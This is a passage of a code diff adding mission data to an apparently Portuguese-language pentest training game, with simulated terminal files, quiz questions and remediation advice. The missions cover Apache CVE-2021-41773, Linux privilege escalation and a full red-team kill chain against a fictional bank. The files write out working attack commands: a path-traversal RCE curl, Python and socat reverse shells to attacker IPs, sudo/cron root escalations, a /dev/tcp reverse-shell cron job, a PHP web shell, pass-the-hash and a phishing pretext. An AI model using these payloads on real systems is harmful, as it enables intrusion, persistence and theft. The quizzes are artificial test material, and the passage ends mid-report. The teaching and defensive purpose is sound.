+      "/home/hacker/netcat_listener.txt": `# Maquina atacante (Kali Linux)
+# Antes de enviar o payload, configurar listener:
+
+$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+# Apos enviar o payload curl:
+Connection received on 192.168.10.50 54321
+
+bash: no job control in this shell
+www-data@targetcorp:/usr/lib/cgi-bin$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@targetcorp:/usr/lib/cgi-bin$ whoami
+www-data
+
+www-data@targetcorp:/usr/lib/cgi-bin$ uname -a
+Linux targetcorp 4.15.0-154-generic x86_64 GNU/Linux
+
+*** SHELL OBTIDA! Acesso inicial como www-data ***
+*** Proximo passo: estabilizar a shell e escalar privilegios ***`,
+
+      "/home/hacker/stabilize_shell.txt": `# Shell reversa raw (netcat) e instavel:
+# - Ctrl+C mata o listener inteiro (perde acesso)
+# - Setas mostram ^[[A em vez de navegar historico
+# - Tab nao funciona
+# - sudo e programas interativos falham
+
+=== METODO 1: Python PTY (mais comum) ===
+# No shell www-data recebido:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Ctrl+Z para suspender o processo nc
+# No terminal Kali:
+stty raw -echo; fg
+
+# De volta ao shell www-data:
+export TERM=xterm
+stty rows 40 cols 200
+
+-> Shell estavel com:
+   OK Setas e historico funcionando
+   OK Tab completion
+   OK Ctrl+C funcional
+   OK sudo e mysql nao falham
+
+=== METODO 2: socat (shell completa desde o inicio) ===
+# Kali (listener):
+socat file:\`tty\`,raw,echo=0 tcp-listen:4444
+
+# No servidor (via curl RCE):
+echo;socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.100:4444
+
+=== METODO 3: rlwrap (mais simples) ===
+# Kali:
+rlwrap nc -lvnp 4444
+# Adiciona historico e setas sem estabilizacao extra`,
+    },
+    perguntas: [
+      {
+        id: 1,
+        texto: "O exploit usa '.%2e/' em vez de '../'. Por que essa codificação bypassa a proteção do Apache 2.4.49?",
+        opcoes: [
+          { id: "a", texto: "O Apache não verifica URLs com caracteres especiais codificados" },
+          { id: "b", texto: "O Apache 2.4.49 não normaliza '%2e' para '.' antes de verificar o path — a proteção busca por '../' literal, mas o filesystem interpreta '.%2e/' como '../' depois da verificação" },
+          { id: "c", texto: "O Apache ignora tudo que vem após '/cgi-bin/'" },
+          { id: "d", texto: "É uma falha no protocolo HTTP, não no Apache" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Análise correta da falha! CVE-2021-41773 é uma falha de normalização: o Apache 2.4.49 verificava segurança buscando '../' literal, mas não decodificava '%2e' antes dessa verificação. Então '.%2e/' passa pela proteção, mas é interpretado como '../' pelo sistema de arquivos — path traversal bem-sucedido. Corrigido no 2.4.51 com normalização completa antes de qualquer verificação.",
+        feedback_errado: "CVE-2021-41773 explora uma falha de sequência de operações: '%2e' é o ponto '.' codificado em URL. O Apache 2.4.49 verificava se a URL continha '../' ANTES de decodificar completamente o path. Então '.%2e/' não é reconhecido como '../' na verificação, mas o filesystem o interpreta como '../' quando resolve o arquivo — escapando do DocumentRoot."
+      },
+      {
+        id: 2,
+        texto: "O rce_shell.txt usa o corpo da requisição 'echo;id' para executar o comando 'id'. Por que o 'echo;' é necessário antes do comando?",
+        opcoes: [
+          { id: "a", texto: "Para imprimir uma mensagem de status antes do resultado" },
+          { id: "b", texto: "CGI requer que a saída comece com headers HTTP — 'echo' sem argumentos imprime uma linha vazia que funciona como separador de headers, sem ela o Apache retorna erro 500" },
+          { id: "c", texto: "Para separar os comandos em dois processos diferentes" },
+          { id: "d", texto: "O 'echo' instrui o shell a executar o próximo comando como root" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Detalhe técnico importante de CGI! O protocolo CGI exige que a saída do script comece com headers HTTP seguidos de uma linha em branco. 'echo' sem argumentos imprime exatamente uma linha vazia — o Apache interpreta como o separador headers/body. Sem isso: erro 500. Com 'echo;id': linha vazia = fim dos headers, output de 'id' = body da resposta HTTP.",
+        feedback_errado: "CGI (Common Gateway Interface) requer que a saída do script siga o formato HTTP: headers, linha vazia, corpo. 'echo' sem argumentos imprime somente uma linha vazia — isso satisfaz o requisito mínimo de header (o Apache aceita uma linha em branco como 'sem headers adicionais'). Sem essa linha vazia: Apache retorna erro 500 Internal Server Error e não repassa a saída."
+      },
+      {
+        id: 3,
+        texto: "Por que uma shell reversa raw de netcat precisa ser 'estabilizada' com python3 + pty?",
+        opcoes: [
+          { id: "a", texto: "Apenas por questão estética — a shell funciona igual sem estabilização" },
+          { id: "b", texto: "Shell raw sem PTY: Ctrl+C fecha o netcat inteiro (perde o acesso), setas exibem sequências de escape cruas, Tab não funciona, sudo e programas interativos falham — pty.spawn cria um pseudo-terminal completo" },
+          { id: "c", texto: "A estabilização criptografa o tráfego da shell" },
+          { id: "d", texto: "Somente para evitar detecção pelo IDS" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Problema real e prático! Shell via netcat sem PTY: Ctrl+C mata o listener (perde o acesso!), setas mostram '^[[A' ao invés de navegar pelo histórico, Tab exibe o caractere literal, sudo falha ('no tty present'), mysql -u root -p não funciona. python3 -c 'import pty; pty.spawn(\"/bin/bash\")' cria um pseudo-terminal real, transformando a conexão netcat em algo próximo de um SSH.",
+        feedback_errado: "Shell netcat sem PTY é extremamente limitada em operação real: Ctrl+C encerra o netcat inteiro (perda de acesso!), setas de navegação mostram sequências de escape cruas, Tab não completa comandos, sudo e qualquer programa que precise de terminal interativo falha. pty.spawn cria um pseudo-terminal que resolve todos esses problemas — shell funcional como um SSH."
+      },
+      {
+        id: 4,
+        texto: "O Path Traversal expôs a chave SSH privada de carlos (~/.ssh/id_rsa). Como obter acesso SSH estável usando essa chave?",
+        opcoes: [
+          { id: "a", texto: "Copiar a chave e enviar ao cliente como evidência por e-mail" },
+          { id: "b", texto: "Salvar a chave localmente, chmod 600 id_rsa (obrigatório), e conectar com: ssh -i id_rsa carlos@192.168.10.50 — shell SSH completa sem senha" },
+          { id: "c", texto: "A chave privada sozinha não é suficiente para autenticar por SSH" },
+          { id: "d", texto: "Importar a chave no browser para acesso ao painel web" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Processo correto! (1) curl salva a chave: curl 'http://.../path_traversal.../home/carlos/.ssh/id_rsa' -o id_rsa, (2) chmod 600 id_rsa — OBRIGATÓRIO: SSH rejeita chaves com permissões abertas com erro 'unprotected private key file', (3) ssh -i id_rsa carlos@192.168.10.50 — autenticação por chave, sem senha. SSH é preferível à shell reversa: estável, sem timeout, TTY completo.",
+        feedback_errado: "Para usar chave SSH: (1) salvar o conteúdo da chave em arquivo local (id_rsa), (2) chmod 600 id_rsa — sem isso o SSH recusa com 'permissions are too open', (3) ssh -i id_rsa carlos@192.168.10.50 — autentica com a chave privada. SSH é muito mais estável que shell reversa: persiste por horas, TTY completo, sem problemas de estabilização, e é o acesso preferido em engajamentos de red team."
+      }
+    ],
+    conclusao: {
+      o_que_aconteceu: "CVE-2021-41773 no Apache 2.4.49 permitiu Path Traversal para leitura de arquivos críticos (/etc/passwd, chave SSH privada de carlos, config.php com senha do banco) e — com mod_cgi ativo — Remote Code Execution completo resultando em shell reversa como www-data.",
+      vulnerabilidade: "CVE-2021-41773 (CVSS 9.8): falha de normalização de URL no Apache 2.4.49. Agravado por: mod_cgi ativo desnecessariamente, chave SSH sem passphrase exposta, credenciais de banco de dados em arquivo web-acessível.",
+      risco: "Acesso inicial (foothold) estabelecido como www-data. Com chave SSH de carlos: acesso SSH estável. Com credenciais do banco: acesso a dados. Próximo passo natural: escalada de privilégios para root.",
+      como_corrigir: "1. Atualizar Apache para 2.4.51+ (patch do CVE) — atualização emergencial\n2. Desabilitar mod_cgi se não necessário ('a2dismod cgi')\n3. Proteger chaves SSH com passphrase obrigatória\n4. Armazenar credenciais de banco fora do webroot (variáveis de ambiente ou .env fora de /var/www)\n5. Adicionar 'Require all denied' como default no Apache",
+      boa_pratica: "CVEs críticos explorados in-the-wild devem ser patchados em 24-72h. CVE-2021-41773 foi descoberto e explorado massivamente em outubro de 2021. Metasploit tem módulo pronto: exploit/multi/http/apache_normalize_path_rce. Defense-in-depth: WAF com regras para '%2e' em paths, monitoramento de logs Apache para padrões suspeitos, e alertas para acessos a /etc/passwd e arquivos fora do webroot."
+    }
+  },
+
+  // ─── MISSÃO 22 ────────────────────────────────────────────────────────────
+  {
+    id: 22,
+    titulo: "Escalada de Privilégios — Linux",
+    subtitulo: "De www-data a root: sudo, SUID e crontab malconfigurado",
+    dificuldade: "Difícil",
+    tipo: "terminal",
+    pontos_maximos: 200,
+    icone: "⬆️",
+    contexto: `Shell estabelecida como <strong>www-data</strong> — usuário de baixo privilégio do Apache.
+Para comprometimento total do servidor, você precisa escalar para <strong>root</strong>.
+Execute enumeração sistemática com LinPEAS: analise sudo, binários SUID, crontabs e arquivos graváveis.
+<em>Autorização cobre escalada de privilégios no servidor 192.168.10.50.</em>`,
+    dica: "Comece com <code>cat linpeas_resumo.txt</code> para o overview, depois <code>cat sudo_l.txt</code>, <code>cat crontab_root.txt</code> e <code>cat exploit_sudo.txt</code>.",
+    filesystem: {
+      "/": ["home", "opt", "var", "etc"],
+      "/home": ["hacker"],
+      "/home/hacker": ["linpeas_resumo.txt", "sudo_l.txt", "suid_bins.txt", "crontab_root.txt", "writable_files.txt", "exploit_sudo.txt"],
+      "/opt": ["backup"],
+      "/opt/backup": ["backup.sh"],
+      "/etc": ["crontab"],
+      "/var": ["log"],
+      "/var/log": ["pentest.log"],
+    },
+    files: {
+      "/home/hacker/linpeas_resumo.txt": `# LinPEAS -- Linux Privilege Escalation Awesome Script
+# Rodado como www-data em targetcorp
+# Resumo dos achados mais criticos
+
+=== Sudo version ===
+Sudo 1.8.31p1 -- CVE-2021-3156 pode ser aplicavel
+
+=== Sudo commands (CRITICO) ===
+www-data pode rodar como root SEM SENHA:
+  (root) NOPASSWD: /usr/bin/find
+  (root) NOPASSWD: /usr/bin/python3.8
+  !! VETORES DE ESCALADA IDENTIFICADOS !!
+
+=== SUID binaries ===
+Binarios com bit SUID (executam como dono = root):
+  /usr/bin/python3.8  <- GTFOBins!
+  /usr/bin/find       <- GTFOBins!
+  /usr/bin/pkexec     <- CVE-2021-4034 (PwnKit)!
+  /usr/bin/passwd
+  /usr/bin/sudo
+  /bin/su
+
+=== Interesting files ===
+  /opt/backup/backup.sh  <- GRAVAVEL por www-data!
+                            Executado por cron como ROOT!
+  Permissoes: -rwxrwxrwx (777 -- todos podem escrever)`,
+
+      "/home/hacker/sudo_l.txt": `# Comando executado: sudo -l
+# (como www-data, sem necessidade de senha)
+
+Matching Defaults entries for www-data on targetcorp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User www-data may run the following commands on targetcorp:
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/python3.8
+
+# CRITICO: www-data pode executar find e python3.8 como root SEM SENHA!
+# Referencia: GTFOBins -- https://gtfobins.github.io/`,
+
+      "/home/hacker/suid_bins.txt": `# Comando: find / -perm -4000 -type f 2>/dev/null
+# Busca binarios com SUID bit ativo (executam como root)
+
+/usr/bin/python3.8   <- sudo + SUID = root garantido
+/usr/bin/find        <- sudo + SUID = root garantido
+/usr/bin/pkexec      <- CVE-2021-4034 (PwnKit) -- local privesc
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/sudo
+/bin/su
+/bin/mount
+/usr/sbin/exim4
+
+# NOTA: pkexec vulneravel ao CVE-2021-4034 (publicado jan/2022)
+# Existe desde 2009, afeta todas as distros Linux`,
+
+      "/home/hacker/crontab_root.txt": `# Comando: cat /etc/crontab
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user    command
+17  *   *   *   *   root    run-parts /etc/cron.hourly
+25  6   *   *   *   root    run-parts /etc/cron.daily
+
+# Backup automatizado -- executado como ROOT a cada 5 minutos
+*/5  *   *   *   *   root    /opt/backup/backup.sh
+
+# VULNERABILIDADE CRITICA:
+# /opt/backup/backup.sh e executado como ROOT
+# mas tem permissao 0777 -- www-data pode ESCREVER nesse arquivo!
+# Escrever payload no script -> cron executa como root -> privesc!`,
+
+      "/home/hacker/writable_files.txt": `# Verificacao de permissoes do script de backup:
+# ls -la /opt/backup/backup.sh
+
+-rwxrwxrwx 1 root root 247 Feb 01 10:30 /opt/backup/backup.sh
+#  ^-- 777 = TODOS podem ler, escrever e executar!
+
+# Conteudo atual do script:
+#!/bin/bash
+tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz /var/www/html/
+echo "Backup concluido" >> /var/log/backup.log
+
+# VETOR DE ATAQUE:
+# 1. Sobrescrever backup.sh com payload malicioso
+# 2. Aguardar cron executar (maximo 5 minutos)
+# 3. Cron executa backup.sh como root
+# 4. Payload executa como root -> escalada completa!`,
+
+      "/home/hacker/exploit_sudo.txt": `# EXPLOIT 1: sudo find -> root (MAIS RAPIDO -- resultado imediato)
+# GTFOBins: https://gtfobins.github.io/gtfobins/find/
+
+$ sudo find . -exec /bin/bash -p \\;
+
+bash-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+
+bash-5.0# whoami
+root
+
+# ROOT OBTIDO EM 1 COMANDO!
+
+# EXPLOIT 2: sudo python3.8 -> root
+$ sudo python3.8 -c 'import os; os.system("/bin/bash")'
+
+bash-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# EXPLOIT 3: crontab gravavel -> root (ate 5 minutos)
+$ echo 'chmod u+s /bin/bash' >> /opt/backup/backup.sh
+# Aguardar cron executar...
+# Depois:
+$ /bin/bash -p
+bash-5.0# id
+uid=0(root) gid=0(root)
+
+# VERIFICACAO FINAL (root pode ler /etc/shadow):
+$ cat /etc/shadow
+root:$6$rounds=656000$salt$hash -- agora legivel!
+# Hash pode ser crackeado offline com hashcat`,
+    },
+    perguntas: [
+      {
+        id: 1,
+        texto: "O sudo_l.txt mostra: (root) NOPASSWD: /usr/bin/find. Usando GTFOBins, qual comando escala para root IMEDIATAMENTE?",
+        opcoes: [
+          { id: "a", texto: "sudo find / -name '*.conf'" },
+          { id: "b", texto: "sudo find . -exec /bin/bash -p \\; — executa bash como root via -exec do find" },
+          { id: "c", texto: "sudo find /etc/passwd -readable -print" },
+          { id: "d", texto: "find / -perm -4000 -type f 2>/dev/null" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Exploit GTFOBins perfeito! sudo find . -exec /bin/bash -p \\; funciona porque: (1) find executa como root via sudo NOPASSWD, (2) -exec permite executar qualquer comando para cada arquivo encontrado, (3) /bin/bash -p abre bash em modo privilegiado mantendo o EUID=0 do sudo. Resultado: shell root imediata, em um único comando. GTFOBins.github.io documenta esse padrão para 300+ binários.",
+        feedback_errado: "sudo find . -exec /bin/bash -p \\; é o exploit GTFOBins para find: (1) sudo eleva para root (NOPASSWD = sem senha), (2) -exec /bin/bash executa bash como root para cada arquivo, (3) -p (privileged mode) impede o bash de resetar o EUID para o usuário original. Resultado: bash interativo como root. GTFOBins documenta vetores de exploração para find, python, vim, nano, e centenas de outros binários."
+      },
+      {
+        id: 2,
+        texto: "O crontab_root.txt mostra /opt/backup/backup.sh executado como ROOT a cada 5 min, com permissão 0777. Como explorar isso?",
+        opcoes: [
+          { id: "a", texto: "Ler o backup para encontrar dados sensíveis no arquivo comprimido" },
+          { id: "b", texto: "Escrever um payload no backup.sh (ex: chmod u+s /bin/bash) e aguardar o cron executar como root — o payload rodará com privilégios root em até 5 minutos" },
+          { id: "c", texto: "Deletar o arquivo backup.sh para parar o cron e causar erro" },
+          { id: "d", texto: "Modificar o crontab para executar com menos frequência" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Crontab privesc clássico! Ataque: echo 'chmod u+s /bin/bash' >> /opt/backup/backup.sh → aguardar até 5 min → /bin/bash -p → shell root. O cron executa o script como root, mas www-data pode modificar o arquivo (0777). Motivo: separação inadequada de privilégios — scripts executados por root devem pertencer ao root e ter permissão 700 ou 750.",
+        feedback_errado: "Script executado por cron como root + modificável por usuário não-privilegiado = escalada garantida. www-data escreve payload no script → cron executa como root → payload roda com privilégio root. Payloads típicos: (1) 'chmod u+s /bin/bash' → /bin/bash -p dá shell root, (2) bash reversa direta no script → receber shell root no listener. Prevenção: chmod 700 /opt/backup/backup.sh && chown root:root /opt/backup/backup.sh."
+      },
+      {
+        id: 3,
+        texto: "Após obter root, qual é a PRIMEIRA ação obrigatória em um pentest ético profissional?",
+        opcoes: [
+          { id: "a", texto: "Instalar um backdoor persistente para garantir acesso durante todo o engajamento" },
+          { id: "b", texto: "Documentar a escalada com evidências mínimas (id, whoami, hostname, data/hora), notificar o cliente do comprometimento total, e não executar ações além do escopo" },
+          { id: "c", texto: "Extrair /etc/shadow completo e crackear todas as hashes offline para o relatório" },
+          { id: "d", texto: "Criar uma conta administrativa oculta para acesso de longo prazo" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Conduta ética essencial! Ao obter root em pentest: (1) Screenshot/log de 'id && whoami && hostname && date' como prova mínima, (2) notificar o cliente imediatamente — comprometimento total é finding crítico que não espera o relatório, (3) parar ou reduzir exploração ao mínimo necessário para prova — sem exfiltrar dados reais, sem instalar backdoors persistentes que fiquem após o teste, sem ações irreversíveis.",
+        feedback_errado: "Após root em pentest ético: (1) DOCUMENTAR com evidências mínimas — 'id; whoami; hostname; date' capturado em screenshot é suficiente para provar o achado, (2) NOTIFICAR imediatamente o cliente — comprometimento total exige comunicação urgente, (3) NÃO instalar backdoors permanentes (problema legal para ambos), (4) NÃO exfiltrar dados reais, (5) NÃO executar ações irreversíveis. Objetivo: provar o risco, não maximizar o dano."
+      },
+      {
+        id: 4,
+        texto: "O suid_bins.txt lista /usr/bin/pkexec com SUID. Isso está relacionado com qual CVE crítico que afeta virtualmente todos os Linux desde 2009?",
+        opcoes: [
+          { id: "a", texto: "CVE-2021-41773 — path traversal no Apache httpd" },
+          { id: "b", texto: "CVE-2021-4034 (PwnKit / Polkit) — buffer overflow no pkexec permitindo escalada local para root por qualquer usuário, presente desde 2009, CVSS 7.8" },
+          { id: "c", texto: "CVE-2022-0847 (Dirty Pipe) — sobrescrita de arquivos read-only via pipe do kernel" },
+          { id: "d", texto: "CVE-2021-3156 (Baron Samedit) — heap overflow no sudo" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "CVE-2021-4034 (PwnKit): pkexec é o SUID binary do Polkit, presente em praticamente todas as distros Linux. Buffer overflow no parsing de argv permite escalada local para root — qualquer usuário local sem senha ou privilégios. Descoberto pela Qualys em janeiro de 2022, existe desde a versão 0.105 de 2009. Exploit PoC público em horas após o disclosure, afetou Red Hat, Ubuntu, Debian, Fedora, CentOS...",
+        feedback_errado: "CVE-2021-4034 é o PwnKit: pkexec (/usr/bin/pkexec) tem buffer overflow no parsing de argv[], presente desde 2009 (versão 0.105 do Polkit). Qualquer usuário local escala para root sem senha. Afetou TODAS as distros Linux. Exploit PoC público lançado horas após a divulgação em jan/2022 — patch obrigatório urgente. Diferente do Dirty Pipe (CVE-2022-0847) que é falha de kernel, não de userspace."
+      }
+    ],
+    conclusao: {
+      o_que_aconteceu: "Escalada de privilégios completa de www-data para root via múltiplos vetores: sudo NOPASSWD para find/python3.8 (exploit GTFOBins em 1 comando), crontab executando script com permissão 0777 (privesc via modificação do script), e binário pkexec vulnerável ao CVE-2021-4034.",
+      vulnerabilidade: "Princípio do menor privilégio completamente violado: www-data com sudo NOPASSWD para binários que permitem execução arbitrária (find, python), cron jobs rodando como root com scripts graváveis por usuários não-privilegiados, binário SUID pkexec desatualizado com CVE público.",
+      risco: "Controle total do servidor (root): leitura de /etc/shadow (hashes de todas as senhas), instalação de rootkits, modificação de qualquer binário do sistema, acesso a todos os dados, e pivoting para rede interna com credenciais de root.",
+      como_corrigir: "1. Remover entradas sudo NOPASSWD ou restringir a scripts controlados sem execução arbitrária\n2. Corrigir permissões de scripts cron: chmod 700 && chown root:root /opt/backup/backup.sh\n3. Remover SUID de binários não essenciais: chmod u-s /usr/bin/python3.8\n4. Atualizar polkit para corrigir CVE-2021-4034\n5. Executar LinPEAS/WinPEAS periodicamente como parte do hardening",
+      boa_pratica: "Enumeração de privesc: LinPEAS (github.com/carlospolop/PEASS-ng) automatiza a busca de vetores em Linux. GTFOBins (gtfobins.github.io) documenta como 300+ binários Unix comuns podem ser explorados para escalada. Princípio do menor privilégio: nenhum processo deve ter mais permissões do que o estritamente necessário. 'sudo -l' e 'find / -perm -4000' devem ser parte da auditoria de segurança regular."
+    }
+  },
+
+  // ─── MISSÃO 23 ────────────────────────────────────────────────────────────
+  {
+    id: 23,
+    titulo: "Red Team Completo — Operação Shadow",
+    subtitulo: "Kill chain end-to-end: recon → acesso → escalada → pivoting → relatório",
+    dificuldade: "Difícil",
+    tipo: "terminal",
+    pontos_maximos: 300,
+    icone: "🎯",
+    contexto: `<strong>Missão final.</strong> Você lidera um exercício de Red Team completo contra a <strong>FinSecure Bank S.A.</strong>
+Contrato assinado, escopo definido: IP range 200.100.50.0/24 e rede interna 10.10.10.0/24.
+Execute a kill chain completa: Reconhecimento → Acesso Inicial → Escalada → Persistência → Movimento Lateral → Exfiltração → Relatório.
+<em>Duração simulada: 72 horas de operação encoberta e documentada.</em>`,
+    dica: "Leia os arquivos em sequência para seguir a kill chain. Comece com <code>cat fase1_recon.txt</code>.",
+    filesystem: {
+      "/": ["home", "opt", "var"],
+      "/home": ["redteam"],
+      "/home/redteam": ["fase1_recon.txt", "fase2_acesso.txt", "fase3_privesc.txt", "fase4_persistencia.txt", "fase5_lateral.txt", "fase6_exfiltracao.txt", "relatorio_executivo.txt"],
+      "/opt": ["tools"],
+      "/opt/tools": ["mimikatz_output.txt", "bloodhound_summary.txt"],
+      "/var": ["log"],
+      "/var/log": ["redteam_timeline.txt"],
+    },
+    files: {
+      "/home/redteam/fase1_recon.txt": `# FASE 1 -- RECONHECIMENTO (Horas 0-8)
+# Kill Chain: Reconnaissance
+
+=== RECONHECIMENTO PASSIVO (zero trafego no alvo) ===
+$ theHarvester -d finsecure.com.br -b all
+
+Emails encontrados:
+  ti@finsecure.com.br
+  carlos.admin@finsecure.com.br   <- admin identificado!
+  helpdesk@finsecure.com.br
+
+Hosts encontrados:
+  vpn.finsecure.com.br    -> 200.100.50.10
+  mail.finsecure.com.br   -> 200.100.50.11
+  dev.finsecure.com.br    -> 200.100.50.20  <- servidor dev!
+  old.finsecure.com.br    -> 200.100.50.99  <- servidor antigo!
+
+$ shodan host 200.100.50.20
+Ports: 22, 80, 443, 3306
+Server: Apache/2.4.49 (Ubuntu)   <- CVE-2021-41773!
+
+$ shodan host 200.100.50.99
+Ports: 21, 22, 80, 8888
+Server: Apache/2.2.14
+Jupyter Notebook: 8888/tcp -- SEM AUTENTICACAO!   <- RCE direto!
+
+=== RECONHECIMENTO ATIVO (apos autorizacao formal) ===
+$ nmap -sV -sC --script=vuln 200.100.50.0/24
+
+Achados criticos:
+  200.100.50.20:80  -- CVE-2021-41773 VULNERABLE (CVSS 9.8)
+  200.100.50.99:8888 -- Jupyter sem auth -> RCE imediato
+  200.100.50.10:443  -- VPN Pulse Secure -- verificar CVEs`,
+
+      "/home/redteam/fase2_acesso.txt": `# FASE 2 -- ACESSO INICIAL (Horas 8-16)
+# Kill Chain: Weaponization + Delivery + Exploitation
+
+=== VETOR 1: Jupyter Notebook sem autenticacao ===
+# Acesso via browser: http://200.100.50.99:8888
+# Criar novo notebook Python -- sem solicitar senha!
+
+import subprocess
+result = subprocess.check_output(['id'], text=True)
+# uid=1000(jupyter) gid=1000(jupyter)
+
+# Shell reversa via Jupyter Python:
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("200.100.1.100",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+
+-> Shell obtida: jupyter@old-server (uid=1000)
+
+=== VETOR 2: CVE-2021-41773 no dev server ===
+curl --path-as-is -d "echo;id" \\
+  "http://200.100.50.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+-> uid=33(www-data) -- RCE confirmado
+
+=== VETOR 3: Spear Phishing (engenharia social) ===
+# carlos.admin@finsecure.com.br identificado no OSINT
+# E-mail crafted com pretexto de alerta de segurança urgente:
+From: security-notice@finsecure-alert.com.br  <- typosquatting
+To: carlos.admin@finsecure.com.br
+Subject: [URGENTE] Vulnerabilidade Critica -- Acao Requerida
+
+-> Carlos clicou no link malicioso -- credenciais capturadas!
+-> carlos.admin / Fin@2024Secure#`,
+
+      "/home/redteam/fase3_privesc.txt": `# FASE 3 -- ESCALADA DE PRIVILEGIOS (Horas 16-24)
+# Kill Chain: Installation (gaining higher access)
+
+=== NO OLD-SERVER (jupyter, uid=1000) ===
+$ sudo -l
+(root) NOPASSWD: /usr/bin/python3
+
+$ sudo python3 -c 'import os; os.system("/bin/bash")'
+root@old-server:~# id
+uid=0(root) gid=0(root)
+-> ROOT obtido via sudo python3!
+
+# Extrair /etc/shadow para crackear offline:
+root@old-server:~# cat /etc/shadow
+
+# Chave SSH do root encontrada:
+root@old-server:~# cat /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+[chave privada do root -- possivelmente reutilizada em outros servidores]
+
+=== NO DEV-SERVER (www-data) ===
+$ sudo find . -exec /bin/bash -p \\;
+bash-5.0# id
+uid=0(root) gid=0(root)
+-> ROOT via sudo find (GTFOBins)!`,
+
+      "/home/redteam/fase4_persistencia.txt": `# FASE 4 -- PERSISTENCIA (Horas 24-32)
+# Kill Chain: Installation (maintaining access)
+
+=== BACKDOOR SSH (mais sigiloso) ===
+echo "ssh-rsa AAAAB3NzaC1... redteam@kali" >> /root/.ssh/authorized_keys
+-> ssh -i redteam_key root@200.100.50.99 funciona mesmo apos reboot
+
+=== CRON JOB REVERSO (reconexao automatica) ===
+(crontab -l; echo "0 * * * * bash -i >& /dev/tcp/200.100.1.100/4445 0>&1") | crontab -
+-> Reconexao a cada hora automaticamente
+
+=== WEB SHELL (acesso via HTTP) ===
+echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/.sys.php
+-> http://200.100.50.20/.sys.php?c=id funciona como backdoor
+
+=== OBRIGACOES ETICAS EM PENTEST ===
+  DOCUMENTAR todos os backdoors instalados (tipo, local, data)
+  REMOVER todos ao final do engajamento
+  NUNCA deixar backdoors em producao apos conclusao do teste
+  Relatorio deve listar TODOS os acessos persistentes criados`,
+
+      "/home/redteam/fase5_lateral.txt": `# FASE 5 -- MOVIMENTO LATERAL (Horas 32-48)
+# Kill Chain: Command & Control + Lateral Movement
+
+=== PIVOTING PARA REDE INTERNA ===
+# old-server esta conectado a rede interna 10.10.10.0/24!
+# Criar tunnel SSH SOCKS5 para pivotar:
+
+ssh -i redteam_key -D 9050 root@200.100.50.99
+# Cria proxy SOCKS5 local na porta 9050
+
+# Acessar rede interna via proxychains:
+proxychains nmap -sT -p 22,80,443,3306,1433 10.10.10.0/24
+
+Hosts internos descobertos:
+  10.10.10.10  -- Windows Server 2019 (Domain Controller)
+  10.10.10.20  -- Windows Server 2016 (File Server)
+  10.10.10.30  -- SQL Server 2019 (Database)
+
+=== PASS-THE-HASH NO WINDOWS ===
+# Extrair hashes NTLM do Windows comprometido (via carlos.admin):
+mimikatz# sekurlsa::logonpasswords
+  Username: carlos.admin
+  NTLM: 32ed87bdb5fdc5e9cba88547376818d4
+
+# Mover lateralmente com o hash (sem precisar da senha em texto):
+proxychains impacket-smbexec FINSECURE/carlos.admin@10.10.10.10 \\
+  -hashes :32ed87bdb5fdc5e9...
+-> Shell no Domain Controller como carlos.admin!`,
+
+      "/home/redteam/fase6_exfiltracao.txt": `# FASE 6 -- EXFILTRACAO SIMULADA (Horas 48-64)
+# Kill Chain: Actions on Objectives
+
+=== OBJETIVO: PROVAR ACESSO A DADOS CRITICOS ===
+# Exfiltracao real de dados em pentest = PROIBIDO sem autorizacao especifica
+# Em vez disso: evidenciar que o acesso ERA possivel
+
+# No SQL Server interno (via tunnel):
+proxychains sqlcmd -S 10.10.10.30 -U sa -P 'Senha@123'
+1> SELECT COUNT(*) FROM FinSecure_Core.dbo.clientes
+2> GO
+-> 2.347.819 registros de clientes identificados
+
+# Capturar apenas schema e contagem -- NAO exfiltrar dados reais:
+1> SELECT TOP 0 * FROM clientes  <- apenas estrutura, sem dados
+2> GO
+Colunas: id, nome, cpf, saldo, conta, agencia, ...
+
+=== IMPACTO SE FOSSE ATAQUE REAL ===
+-> 2.3M clientes expostos (LGPD -- dado financeiro = categoria especial)
+-> Notificacao BACEN obrigatoria (Resolucao BCB 85/2021)
+-> Notificacao ANPD em 72h (LGPD Art. 48)
+-> Multa LGPD: ate 2% do faturamento, limitado a R$ 50M por infracao
+
+=== CLEANUP OBRIGATORIO ===
+  OK SSH authorized_keys revertido
+  OK Crontab limpo
+  OK Web shell .sys.php deletado
+  OK Todos os acessos documentados no relatorio`,
+
+      "/home/redteam/relatorio_executivo.txt": `# RELATORIO EXECUTIVO -- RED TEAM
+# FinSecure Bank S.A. | Operacao Shadow
+# Duracao: 72h | Red Team: 3 analistas
+# Data: 2024-02-12 a 2024-02-15
+
+RESULTADO: COMPROMETIMENTO TOTAL DO AMBIENTE
+Objetivo atingido: acesso ao Domain Controller e dados de 2.3M clientes.
+
+ACHADOS CRITICOS (CVSS >= 8.0):
++---+------------------------------+-------+
